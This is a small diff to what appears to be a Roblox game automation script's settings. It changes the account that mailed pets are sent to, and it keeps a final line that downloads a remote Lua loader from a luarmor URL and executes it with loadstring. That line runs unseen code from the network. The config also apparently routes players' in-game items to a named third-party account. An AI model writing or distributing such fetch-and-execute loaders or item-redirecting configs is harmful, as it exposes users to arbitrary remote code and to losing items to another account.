@@ -13,6 +13,6 @@ EVENT_EGG = true,
     MAIL_PET = true,  
     MAIL_WEBHOOK_ODDS = 50000000, 
     MAIL_PET_ODDS = 50000000,  
-    USERNAME_TO_MAIL = "petfastziinn01" 
+    USERNAME_TO_MAIL = "JoyceArthur857" 
 }
 loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/e81ea00ef49a917bb1242da4f41dc4f9.lua"))()
